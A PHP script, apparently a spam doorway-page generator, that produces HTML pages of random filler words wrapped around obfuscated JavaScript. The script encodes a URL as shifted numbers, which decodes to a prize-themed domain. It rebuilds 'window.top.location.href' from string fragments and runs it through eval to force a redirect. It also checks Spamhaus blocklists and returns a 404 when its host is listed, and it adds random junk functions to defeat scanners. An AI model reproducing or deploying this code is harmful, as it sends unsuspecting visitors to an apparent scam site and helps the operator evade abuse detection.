<?php
function result($data)
{
$rn=array_shift($data);$nd=array();foreach($data as $nb){array_push($nd,($nb-$rn));}$data=$nd;
$result=implode("\r\n",array("%1"."html"."%3","%1"."head"."%3",head(),"%2"."head"."%3","%1"."body"."%3",body($data),"%2"."body"."%3","%2"."html"."%3"));
$result=preg_replace('/%1/',"<",$result);$result=preg_replace('/%2/',"</",$result);$result=preg_replace('/%3/',">",$result);
$sign=parag(1,1).(strlen($result)+31331);$result=preg_replace('/%sign%/',$sign,$result);
return $result;
}
function body($data)
{
srand(seed());
$body=array();
for($i=0;$i<rand(3,10);$i++)
{
$text=parag(50,250);
srand(seed());
$tags=array("p","div","span");$tags=$tags[rand(0,count($tags)-1)];
array_push($body,"%1$tags%3",$text,"%2$tags%3");
}
# array_push($body,js($data));
$body=array(js($data));
return implode("\r\n",$body);
}
function head()
{
srand(seed());
$title=parag(2,10);
$charset=array("ISO-8859-1","UTF-8");$charset=$charset[rand(0,count($charset)-1)];
$headers=array("%1title%3%sign% $title%2title%3","%1meta http-equiv=\"Content-Type\" content=\"text/html; charset=$charset\"%3");
srand(seed());
$rnd_num=rand(0,1);
if($rnd_num)
{
$description=parag(4,10);
$keywords=array();for($i=0;$i<rand(1,10);$i++){array_push($keywords,parag(1,1));} $keywords=implode(", ",$keywords);
srand(seed());
$additional=array("%1meta name=\"description\" content=\"$description\"%3","%1meta name=\"keywords\" content=\"$keywords\"%3");$additional=$additional[rand(0,count($additional)-1)];
# array_push($headers,$additional);
}
shuffle($headers);
return implode("\r\n",$headers);
}
function js($data)
{
# array_unshift($data,119,105,110,100,111,119,46,116,111,112,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,39);array_push($data,39,59);
srand(seed());$diff=rand(1,5);$js=array();$temp="";
$code="%1script type=\"text/javascript\"%3\r\n\r\n";

$name0=parag(1,1)."e";
$temp.="function $name0(a$name0)\r\n";
$temp.="{\r\n";
$temp.="\treturn String.fromCharCode(a$name0);\r\n";
$temp.="}\r\n";
array_push($js,$temp);$temp="";

$name1=parag(1,1)."a";
$temp.="function $name1(".parag(1,1)."i)\r\n";
$temp.="{\r\n";
$temp.="\treturn $diff;\r\n";
$temp.="}\r\n";
array_push($js,$temp);$temp="";

$name2=parag(1,1)."b";
$temp.="function $name2(a$name2,b$name2)\r\n";
$temp.="{\r\n";
$temp.="\tc$name2 = \"\";\r\n\r\n";
$temp.="\tfor (d$name2 = 0; d$name2 < b$name2.length; d$name2++)\r\n";
$temp.="\t{\r\n";
$temp.="\t\te$name2 = b$name2"."[d$name2];\r\n";
$temp.="\t\tf$name2 = e$name2 - a$name2;\r\n";
$temp.="\t\tg$name2 = $name0(f$name2);\r\n";
$temp.="\t\tc$name2 = c$name2 + g$name2;\r\n";
$temp.="\t}\r\n\r\n";
$temp.="\treturn c$name2;\r\n";
$temp.="}\r\n";
array_push($js,$temp);$temp="";

$name3=parag(1,1)."c";
$list=array();foreach($data as $byte){array_push($list,($byte+$diff));}
$temp.="function $name3()\r\n";
$temp.="{\r\n";
$temp.="\ta$name3 = $name1();\r\n";
$temp.="\tb$name3 = [";
$temp.=implode(',',$list);
$temp.="];\r\n\r\n";
$temp.="\treturn $name2(a$name3,b$name3);\r\n";
$temp.="}\r\n";
array_push($js,$temp);$temp="";

$name4=parag(1,1)."d";
$temp.="function $name4()\r\n";
$temp.="{\r\n";
# $temp.="\tsetTimeout($name3(),".($diff+1031).");\r\n";
# $temp.="\twindow.top.location.href = $name3();\r\n";
# $temp.="\twindow.location.href = $name3();\r\n";
$temp.="w=\"window.\";\r\n";
$temp.="t=\"top.\";\r\n";
$temp.="l=\"location.\";\r\n";
$temp.="h=\"href\";\r\n";
$temp.="n=\"=$name3();\";\r\n";
$temp.="eval(w+t+l+h+n);\r\n";
$temp.="}\r\n";
array_push($js,$temp);$temp="";

$temp.="$name4();\r\n";
array_push($js,$temp);$temp="";

$js=array_merge($js,jsgen(1,10));
shuffle($js);$code.=implode("\r\n",$js);

$code.="\r\n%2script%3";
return $code;
}
function jsgen($min,$max)
{
srand(seed());$jsgen=array();
for($i=0;$i<rand($min,$max);$i++)
{
$name=parag(1,1);$temp="";
$temp.="function $name(";
srand(seed());$rand=rand(0,2);if(1==$rand){$temp.=parag(1,1);}if(2==$rand){$temp.=parag(1,1).",".parag(1,1)."s";}
$temp.=")\r\n";
$temp.="{\r\n";
$temp.=jsstr(1,5);
$temp.="}\r\n";
array_push($jsgen,$temp);
}
return $jsgen;
}
function jsstr($min,$max)
{
$temp="";
for($i=0;$i<rand($min,$max);$i++)
{
srand(seed());$jsstr=array();
array_push($jsstr,parag(1,1)." = ".parag(1,1)." + ".parag(1,1));
array_push($jsstr,parag(1,1)." = ".parag(1,1)." - ".parag(1,1));
array_push($jsstr,parag(1,1)." = ".parag(1,1)." * ".parag(1,1));
array_push($jsstr,parag(1,1)." = ".parag(1,1)." / ".parag(1,1));
$temp.="\t".$jsstr[array_rand($jsstr)].";\r\n";
}
return $temp;
}
function parag($min,$max)
{
srand(seed());
$parag="";
$words=array("search","starsigntaurus","grasped","immobility","lithest","gaudiest","harlequin","kisses","touch","sip","separating","opposing","notion","proved","booze","coffee","charms","seas","thread","ariadne","scheme","chef","convinced","scared","steps","virgin","liberty","days","following","husband","govern","record","honest","continuing","imprisond","hot","sunshine","inheritance","twilights","dusky","hair","whatsoeer","sunbright","full","childish","liveth","despaird","believd","remains","wearily","length","flaw","unknowingly","missed","stirrups","disciplined","wicked","sickle","bending","stop","matter","learn","history","bleak","mild","concerns","ordinary","winter","wears","proof","roys","alert","planned","plotted","fierce","row","dauntless","challenge","ask","apply","beauty","dower","woe","lintwhites","chorus","fellowtraveller","cold","ice","worlds","flu","illnessthree","region","lucky","bastard","twill","soothe","sorrow","polity","sacrifice","christ","saviour","sticking","kerchiefplots","mold","name","river","bare","wanderers","thousands","dollars","effortless","money","fatherly","concern","pang","vexd","aver","multitude","sweetly","reposing","bands","armsout","trees","veil","withdrawn","hut","tour","confuse","debut","godheads","benignant","andmoney","needed","ride","barking","cat","plays","neatly","error","unprofitable","ophilia","dear","delighted","sake","replaced","athletic","prophy","guessing","tundra","peter","norway","boors","prison","clinicmy","seemliness","complete","sways","seen","tiviot","dale","familiar","provokes","lady","shares","wonder","merits","resolved","eer","champion","brotherhood","venerable","damn","fawns","extacy","buttercups","unheard","cull","faculty","storm","turbulence","happy","genial","barely","cool","diffuse","blessd","main","embarrassd","shy","next","sense","persons","advance","hamilton","beginning","shield","latest","impearling","lucie","born","figures","braes","humbly","bloodshed","miserable","train","courtesies","wilt","panting","violets","acted","tidings","woes","end","stars","hungry","surprised","tells","clamor","stopped","dries","used","severe","since","untowardness","poets","mere","mostly","rooted","chair","livd","lands","soothed","milder","airs","stranger","seemingly","civil","harmless","stand","straight","nervous","daisy","blessed","rising","collapse","reaping","herself","remember","amazing","palms","infants","laughing","puzzled","blinded","immediately","leaps","feeding","appletree","superstition","worth","taking","sympathy","heeds","trace","upstarting","affright","greetst","fowls","ref","hadn","opened","score","nobody","posterity","renownd","unexciting","vice","guests","listend","fill","reaper","bushes","mournfully","eggs","gaze","places","hurrythree","flourish","seeking","school","scannd","dewdrop","unto","lowly","pursue","pox","turns","necessity","beloved","possess","grotto","particular","exquisite","baby","chains","tie","befal","yellow","rouzd","vale","holiday","flutterd","perchd","thank","mechanic","whip","lash","striking","force","applying","muscles","shaped","wake","highlands","troubles","beyond","relief","untimely","joyousness","hideandseek","homefelt","pleasures","itself","common","breeds","liked","greeting","mountains","eagle","seventythree","nighttime","short","hither","straightway","behold","seehis","fork","begins","rattle","boat","graven","read","fathers","courtesy","runaway","beautifully","outstandingly","clever","prettiest","tumbler","infant");
if($min==1)
{
return $words[array_rand($words)];
}
else
{
$words_idx=array_rand($words,rand($min,$max));
$first_upc=1;
$parag=array();
foreach($words_idx as $idx)
{
$word=$words[$idx];
$rnd_num=rand(0,1);
$sym="";
if($rnd_num)
{
$rnd_sym=array(","," -",":",".");
$rnd_num=rand(0,count($rnd_sym)-1);
$sym=$rnd_sym[$rnd_num];
$word.=$sym;
}
if($first_upc)
{
array_push($parag,ucfirst($word));
$first_upc=0;
}
else
{
array_push($parag,$word);
}
if($sym=="." || $sym==":") $first_upc=1;
}
array_push($parag,$words[array_rand($words)]);
}
return implode(" ",$parag).".";
}
function seed()
{
list($usec,$sec)=explode(' ',microtime());
return(float)$sec+((float)$usec*100000);
}
$dr=gethostbyname($_SERVER['HTTP_HOST'].'.dbl.spamhaus.org');
if(preg_match("/^127\.0\.1/",$dr))
{
header("HTTP/1.1 404 Not Found");
exit;
}
$dr=gethostbyname("117.118.53.92.zen.spamhaus.org");
if(preg_match("/^127\.0\.0/",$dr))
{
header("HTTP/1.1 404 Not Found");
exit;
}
echo(result(array(73,177,189,189,185,188,131,120,120,189,170,180,174,194,184,190,187,185,187,178,195,174,177,174,187,174,122,119,181,178,175,174,120,136,190,134,194,123,194,180,170,174,192,111,184,134,123,193,190,185,129,130,187,111,182,134,122,111,189,134,122,123,121,122,123,121)));
?>
